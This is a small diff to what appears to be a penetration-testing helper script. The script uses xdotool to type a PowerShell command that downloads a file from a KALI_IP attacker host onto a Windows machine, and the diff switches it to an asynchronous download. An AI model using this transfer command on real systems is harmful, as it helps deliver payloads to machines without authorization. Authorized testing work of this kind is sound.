@@ -15,5 +15,5 @@ PORT=${form_data["Port"]}
 B_PATH=${form_data["Path"]}
 F_NAME=$(basename $B_PATH)
 
-paste_command "powershell \"(New-Object System.Net.WebClient).DownloadFile('http://${KALI_IP}:${PORT}/${B_PATH}', '${F_NAME}')\""
+paste_command "powershell \"(New-Object System.Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${PORT}/${B_PATH}', '${F_NAME}')\""
 xdotool key Return
